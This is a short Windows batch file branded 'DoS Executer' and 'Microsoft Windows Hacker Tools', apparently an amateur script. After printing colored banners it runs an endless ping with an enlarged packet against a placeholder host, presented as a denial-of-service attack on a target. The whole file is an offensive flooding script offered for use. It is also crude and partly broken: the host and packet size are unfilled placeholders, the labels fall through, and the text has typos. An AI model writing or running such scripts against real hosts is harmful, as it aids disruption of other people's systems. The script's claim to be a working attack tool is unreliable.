@echo off
title DoS Executer
color e
echo.
echo Microsoft Windows Hacker Tools [v0.510]
echo (c) All rights reserved for Ilaicraft
echo.
color 2
echo [+] DoS to the tarjet....
call :DoS

:DoS
ping yourhostinip -t -l buffer
pause>nul
cls
color 4
echo [X] Press new to exit
pause>nul
exit
